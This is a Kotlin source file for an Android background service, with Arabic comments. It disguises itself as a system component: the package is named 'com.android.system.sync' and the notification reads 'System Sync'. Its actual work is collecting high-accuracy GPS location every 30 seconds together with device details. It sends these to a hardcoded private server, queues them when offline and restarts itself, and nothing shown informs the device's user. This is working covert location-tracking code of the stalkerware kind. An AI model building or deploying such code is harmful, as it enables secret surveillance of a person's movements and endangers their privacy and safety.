package com.android.system.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class LocationService : Service() {

    companion object {
        private const val TAG = "LocationService"
        private const val CHANNEL_ID = "sync_channel"
        private const val NOTIF_ID = 1
        private const val PREFS = "sync_prefs"
        private const val KEY_PENDING = "pending_locations"

        // ⚠️ عنوان السيرفر (Tailscale)
        private const val SERVER_URL = "http://100.126.249.107:5000"
        private const val ENDPOINT_LOCATION = "$SERVER_URL/api/location"
        private const val ENDPOINT_BATCH = "$SERVER_URL/api/locations/batch"
        private const val ENDPOINT_REGISTER = "$SERVER_URL/api/register"

        // الفاصل الزمني (30 ثانية)
        private const val INTERVAL_MS = 30_000L
        private const val MIN_DISTANCE_M = 5f
    }

    private lateinit var fusedClient: FusedLocationProviderClient
    private lateinit var prefs: SharedPreferences
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy {
        val androidId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        )
        "dev_${androidId ?: "unknown"}"
    }

    private var lastSentTime = 0L
    private val sentIds = mutableSetOf<String>()

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")
        prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        fusedClient = LocationServices.getFusedLocationProviderClient(this)

        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("جارٍ المزامنة..."))

        registerDevice()
        startLocationUpdates()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // إذا أعيد تشغيل الخدمة، لا تفعل شيئاً (onCreate يعمل)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        try {
            fusedClient.removeLocationUpdates(locationCallback)
        } catch (_: Exception) {}
        Log.i(TAG, "Service destroyed")
    }

    // ============================================================
    // Notification
    // ============================================================
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "خدمة المزامنة"
                setShowBadge(false)
            }
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Sync")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(NOTIF_ID, buildNotification(text))
    }

    // ============================================================
    // Device Registration
    // ============================================================
    private fun registerDevice() {
        Thread {
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("name", Build.MODEL)
                    put("model", Build.MODEL)
                    put("android_version", Build.VERSION.RELEASE)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                val req = Request.Builder().url(ENDPOINT_REGISTER).post(body).build()
                httpClient.newCall(req).execute().use { resp ->
                    Log.i(TAG, "Register: ${resp.code}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Register failed: ${e.message}")
            }
        }.start()
    }

    // ============================================================
    // Location Updates
    // ============================================================
    private fun startLocationUpdates() {
        val request = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            INTERVAL_MS
        )
            .setMinUpdateDistanceMeters(MIN_DISTANCE_M)
            .setWaitForAccurateLocation(false)
            .build()

        try {
            fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper())
            Log.i(TAG, "Location updates started")
        } catch (e: SecurityException) {
            Log.e(TAG, "No permission: ${e.message}")
        }
    }

    private val locationCallback = object : LocationCallback() {
        override fun onLocationResult(result: LocationResult) {
            val loc = result.lastLocation ?: return
            Log.i(TAG, "Location: ${loc.latitude},${loc.longitude} acc=${loc.accuracy}")

            val payload = buildPayload(loc)

            // حاول الإرسال
            Thread {
                val ok = sendNow(payload)
                if (!ok) {
                    queueLocally(payload)
                    Log.w(TAG, "Queued locally (offline)")
                } else {
                    // عند النجاح، حاول إرسال المخزّن
                    flushQueue()
                }
            }.start()
        }
    }

    private fun buildPayload(loc: Location): JSONObject {
        return JSONObject().apply {
            put("device_id", deviceId)
            put("lat", loc.latitude)
            put("lon", loc.longitude)
            put("accuracy", loc.accuracy.toDouble())
            put("altitude", loc.altitude)
            put("speed", loc.speed.toDouble())
            put("bearing", loc.bearing.toDouble())
            put("provider", loc.provider ?: "unknown")
            put("timestamp", System.currentTimeMillis())
        }
    }

    // ============================================================
    // Network
    // ============================================================
    private fun sendNow(payload: JSONObject): Boolean {
        return try {
            val body = payload.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url(ENDPOINT_LOCATION).post(body).build()
            httpClient.newCall(req).execute().use { resp ->
                val ok = resp.isSuccessful
                if (ok) {
                    lastSentTime = System.currentTimeMillis()
                    val t = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                    updateNotification("آخر إرسال: $t")
                }
                ok
            }
        } catch (e: IOException) {
            Log.w(TAG, "Send failed: ${e.message}")
            false
        }
    }

    // ============================================================
    // Local Queue (offline)
    // ============================================================
    private fun queueLocally(payload: JSONObject) {
        synchronized(this) {
            val existing = prefs.getString(KEY_PENDING, "[]") ?: "[]"
            val arr = JSONArray(existing)
            arr.put(payload)
            prefs.edit().putString(KEY_PENDING, arr.toString()).apply()
        }
    }

    private fun flushQueue() {
        synchronized(this) {
            val existing = prefs.getString(KEY_PENDING, "[]") ?: "[]"
            val arr = JSONArray(existing)
            if (arr.length() == 0) return

            // إرسال دفعة (batch)
            val batch = JSONArray()
            val maxSize = 500
            for (i in 0 until minOf(arr.length(), maxSize)) {
                batch.put(arr.getJSONObject(i))
            }

            val payload = JSONObject().apply {
                put("device_id", deviceId)
                put("locations", batch)
            }

            try {
                val body = payload.toString().toRequestBody("application/json".toMediaType())
                val req = Request.Builder().url(ENDPOINT_BATCH).post(body).build()
                httpClient.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        // احذف المُرسل
                        val remaining = JSONArray()
                        for (i in batch.length() until arr.length()) {
                            remaining.put(arr.getJSONObject(i))
                        }
                        prefs.edit().putString(KEY_PENDING, remaining.toString()).apply()
                        Log.i(TAG, "Flushed ${batch.length()} queued locations")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Flush failed: ${e.message}")
            }
        }
    }
}
